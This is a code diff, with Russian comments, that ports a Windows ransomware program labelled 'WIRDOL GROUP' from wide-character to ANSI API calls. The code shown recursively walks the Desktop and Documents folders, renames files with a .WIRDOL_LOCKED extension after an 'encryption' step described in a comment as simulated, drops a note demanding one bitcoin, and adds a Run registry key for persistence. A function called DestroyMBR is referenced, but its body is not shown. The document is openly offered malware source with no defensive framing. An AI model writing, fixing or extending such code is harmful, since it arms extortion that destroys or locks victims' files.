@@ -14,37 +14,36 @@
 // ==========================================
 // КОНСТАНТЫ И НАСТРОЙКИ
 // ==========================================
-const std::wstring RANSOM_NOTE = L"YOUR_FILES_HAVE_BEEN_ENCRYPTED.txt";
-const std::wstring ENCRYPTED_EXT = L".WIRDOL_LOCKED";
+const std::string RANSOM_NOTE = "YOUR_FILES_HAVE_BEEN_ENCRYPTED.txt";
+const std::string ENCRYPTED_EXT = ".WIRDOL_LOCKED";
 const std::string RANSOM_TEXT = "ALL YOUR FILES HAVE BEEN ENCRYPTED BY WIRDOL GROUP.\n"
                                 "TO DECRYPT THEM, SEND 1 BTC TO: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n"
                                 "CONTACT: wirdol@onion.com\n"
                                 "DO NOT TRY TO RECOVER THEM YOURSELF. YOU WILL LOSE EVERYTHING.";
 
 // ==========================================
-// УТИЛИТЫ ДЛЯ РАБОТЫ С ФАЙЛАМИ
+// УТИЛИТЫ ДЛЯ РАБОТЫ С ФАЙЛАМИ (ИСПОЛЬЗУЕМ char, А НЕ wchar_t)
 // ==========================================
-std::wstring GetDesktopPath() {
-    wchar_t path[MAX_PATH];
-    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, path))) {
-        return std::wstring(path);
+std::string GetDesktopPath() {
+    char path[MAX_PATH];
+    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, path))) {
+        return std::string(path);
     }
-    return L"C:\\Users\\Public\\Desktop";
+    return "C:\\Users\\Public\\Desktop";
 }
 
-std::wstring GetDocumentsPath() {
-    wchar_t path[MAX_PATH];
-    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_PERSONAL, NULL, 0, path))) {
-        return std::wstring(path);
+std::string GetDocumentsPath() {
+    char path[MAX_PATH];
+    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_PERSONAL, NULL, 0, path))) {
+        return std::string(path);
     }
-    return L"C:\\Users\\Public\\Documents";
+    return "C:\\Users\\Public\\Documents";
 }
 
 // ==========================================
 // ШИФРОВАНИЕ ФАЙЛОВ (ИМИТАЦИЯ)
 // ==========================================
-void EncryptFile(const std::wstring& filePath) {
-    // Открываем файл для чтения
+void EncryptFile(const std::string& filePath) {
     std::ifstream inFile(filePath, std::ios::binary);
     if (!inFile) return;
 
@@ -60,34 +59,33 @@ void EncryptFile(const std::wstring& filePath) {
     }
 
     // Меняем расширение
-    std::wstring newPath = filePath + ENCRYPTED_EXT;
-    MoveFileW(filePath.c_str(), newPath.c_str());
+    std::string newPath = filePath + ENCRYPTED_EXT;
+    MoveFileA(filePath.c_str(), newPath.c_str());
 }
 
-void EncryptDirectory(const std::wstring& dirPath) {
-    std::wstring searchPath = dirPath + L"\\*";
-    WIN32_FIND_DATAW findData;
-    HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);
+void EncryptDirectory(const std::string& dirPath) {
+    std::string searchPath = dirPath + "\\*";
+    WIN32_FIND_DATAA findData;
+    HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);
 
     if (hFind == INVALID_HANDLE_VALUE) return;
 
     do {
-        if (wcscmp(findData.cFileName, L".") == 0 || wcscmp(findData.cFileName, L"..") == 0) continue;
+        if (strcmp(findData.cFileName, ".") == 0 || strcmp(findData.cFileName, "..") == 0) continue;
 
-        std::wstring fullPath = dirPath + L"\\" + findData.cFileName;
+        std::string fullPath = dirPath + "\\" + findData.cFileName;
 
         if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
-            // Рекурсивно обходим папки
             EncryptDirectory(fullPath);
         } else {
             // Шифруем файл (пропускаем системные и наши записки)
-            if (fullPath.find(L".exe") == std::wstring::npos && 
-                fullPath.find(L".dll") == std::wstring::npos && 
-                fullPath.find(RANSOM_NOTE) == std::wstring::npos) {
+            if (fullPath.find(".exe") == std::string::npos && 
+                fullPath.find(".dll") == std::string::npos && 
+                fullPath.find(RANSOM_NOTE) == std::string::npos) {
                 EncryptFile(fullPath);
             }
         }
-    } while (FindNextFileW(hFind, &findData));
+    } while (FindNextFileA(hFind, &findData));
 
     FindClose(hFind);
 }
@@ -117,8 +115,8 @@ void DestroyMBR() {
 // ОСТАВЛЯЕМ ЗАПИСКУ
 // ==========================================
 void DropRansomNote() {
-    std::wstring desktop = GetDesktopPath();
-    std::wstring notePath = desktop + L"\\" + RANSOM_NOTE;
+    std::string desktop = GetDesktopPath();
+    std::string notePath = desktop + "\\" + RANSOM_NOTE;
     
     std::ofstream note(notePath);
     if (note) {
@@ -131,12 +129,12 @@ void DropRansomNote() {
 // АВТОЗАГРУЗКА (PERSISTENCE)
 // ==========================================
 void EstablishPersistence() {
-    wchar_t currentPath[MAX_PATH];
-    GetModuleFileNameW(NULL, currentPath, MAX_PATH);
+    char currentPath[MAX_PATH];
+    GetModuleFileNameA(NULL, currentPath, MAX_PATH);
 
     HKEY hKey;
-    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
-        RegSetValueExW(hKey, L"WirdolRansom", 0, REG_SZ, (const BYTE*)currentPath, (wcslen(currentPath) + 1) * sizeof(wchar_t));
+    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+        RegSetValueExA(hKey, "WirdolRansom", 0, REG_SZ, (const BYTE*)currentPath, (strlen(currentPath) + 1) * sizeof(char));
         RegCloseKey(hKey);
     }
 }
@@ -164,8 +162,8 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     DropRansomNote();
 
     // 4. Шифруем файлы на рабочем столе и в документах
-    std::wstring desktop = GetDesktopPath();
-    std::wstring documents = GetDocumentsPath();
+    std::string desktop = GetDesktopPath();
+    std::string documents = GetDocumentsPath();
 
     std::thread t1(EncryptDirectory, desktop);
     std::thread t2(EncryptDirectory, documents);
